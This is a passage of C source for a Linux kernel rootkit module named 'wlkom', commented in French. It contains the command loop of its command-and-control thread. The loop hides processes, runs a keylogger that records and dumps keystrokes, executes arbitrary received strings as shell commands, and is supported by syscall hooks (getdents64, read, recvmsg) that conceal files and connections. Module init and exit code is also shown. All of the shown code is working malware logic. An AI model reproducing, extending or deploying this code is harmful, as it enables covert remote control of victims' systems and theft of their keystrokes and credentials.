        } else if (strncmp(buf, "UNHIDE_PID:", 11) == 0) {
            /* Retirer un PID de la liste des PIDs caches */
            long pid_val;
            if (kstrtol(buf + 11, 10, &pid_val) == 0) {
                unsigned long flags;
                int i, found = 0;
                spin_lock_irqsave(&pid_lock, flags);
                for (i = 0; i < hidden_pid_count; i++) {
                    if (hidden_pids[i] == (pid_t)pid_val) {
                        /* Remplacer par le dernier element (suppression rapide) */
                        hidden_pids[i] = hidden_pids[--hidden_pid_count];
                        found = 1;
                        break;
                    }
                }
                spin_unlock_irqrestore(&pid_lock, flags);
                send_msg(found ? "PID_UNHIDDEN\n" : "ERR:not_found\n",
                         found ? 13 : 14);
            }

        } else if (strcmp(buf, "LIST_HIDDEN_PIDS") == 0) {
            /* Lister tous les PIDs caches */
            char resp[512];
            unsigned long flags;
            int i, off = 0;
            spin_lock_irqsave(&pid_lock, flags);
            for (i = 0; i < hidden_pid_count && off < 480; i++)
                off += snprintf(resp + off, sizeof(resp) - off,
                                "%d ", hidden_pids[i]);
            spin_unlock_irqrestore(&pid_lock, flags);
            if (off == 0) off = snprintf(resp, sizeof(resp), "(none)");
            resp[off++] = '\n';
            send_msg(resp, off);

        } else if (strcmp(buf, "KEYLOG_START") == 0) {
            keylogger_start();
            send_msg("KEYLOGGER_ON\n", 13);

        } else if (strcmp(buf, "KEYLOG_STOP") == 0) {
            keylogger_stop();
            send_msg("KEYLOGGER_OFF\n", 14);

        } else if (strcmp(buf, "KEYLOG_DUMP") == 0) {
            /* Lire et vider le buffer de keylog */
            char *dump = kmalloc(KEYLOG_BUF_SIZE + 16, GFP_KERNEL);
            if (dump) {
                int len = keylog_dump(dump, KEYLOG_BUF_SIZE);
                if (len > 0) {
                    dump[len++] = '\n';
                    send_msg(dump, len);
                } else {
                    send_msg("(empty)\n", 8);
                }
                kfree(dump);
            }

        } else if (strcmp(buf, "KEYLOG_STATUS") == 0) {
            send_msg(keylogger_active ? "KEYLOGGER:ON\n" : "KEYLOGGER:OFF\n",
                     keylogger_active ? 13 : 14);

        } else {
            /* Toute autre commande : executer comme commande shell */
            exec_cmd(buf);
        }
    }

    /* Nettoyage a l'arret du thread */
    if (c2_sock) { sock_release(c2_sock); c2_sock = NULL; }
    printk(KERN_INFO "wlkom: thread stopped\n");
    return 0;
}

/* ============================================================================
 *  INIT / EXIT - Point d'entree et de sortie du module
 * ============================================================================
 *
 *  wlkom_init() est appele quand on fait `insmod wlkom.ko`.
 *  wlkom_exit() est appele quand on fait `rmmod wlkom`.
 *
 *  __init : le code de cette fonction est libere apres l'initialisation
 *  __exit : cette fonction n'est meme pas compilee si le module est built-in
 */

static int __init wlkom_init(void)
{
    printk(KERN_INFO "wlkom: module loaded\n");

    /* Lancer le thread C2 principal */
    c2_thread = kthread_run(c2_thread_fn, NULL, "wlkom_c2");
    if (IS_ERR(c2_thread)) return PTR_ERR(c2_thread);

    return 0;
}

static void __exit wlkom_exit(void)
{
    running = 0;              /* Signaler au thread de s'arreter */
    keylogger_stop();         /* Arreter le keylogger */
    hide_ss_exit();           /* Retirer le hook recvmsg */
    hide_lines_exit();        /* Retirer le hook read */
    hide_files_exit();        /* Retirer le hook getdents64 */
    if (c2_sock) { sock_release(c2_sock); c2_sock = NULL; }  /* Fermer le socket */
    if (c2_thread) kthread_stop(c2_thread);                    /* Arreter le thread */
    printk(KERN_INFO "wlkom: module unloaded\n");
}

/* Macros qui enregistrent les fonctions init et exit */
module_init(wlkom_init);
module_exit(wlkom_exit);
